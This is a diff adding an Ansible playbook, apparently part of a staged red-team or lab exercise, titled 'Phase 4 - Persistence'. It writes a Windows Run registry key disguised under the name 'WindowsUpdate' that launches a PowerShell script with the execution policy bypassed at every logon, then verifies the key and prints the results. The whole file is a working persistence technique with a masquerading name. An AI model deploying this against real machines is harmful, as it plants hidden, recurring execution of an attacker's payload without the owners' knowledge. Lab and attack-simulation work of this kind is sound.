@@ -1,0 +1,26 @@
+# phase4_C.yml (FIXED)
+- name: Phase 4 - Persistence
+  hosts: windows
+  gather_facts: no
+
+  tasks:
+    - name: Add Run key persistence (HKLM)
+      win_regedit:
+        path: HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
+        name: WindowsUpdate
+        data: "powershell -ExecutionPolicy Bypass -File C:\\Lab\\payload.ps1"
+        type: string
+      register: reg_output
+
+    - name: Verify registry key
+      win_shell: |
+        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+      register: verify_output
+
+    - name: Show registry output
+      debug:
+        var: reg_output
+
+    - name: Show verify result
+      debug:
+        var: verify_output.stdout
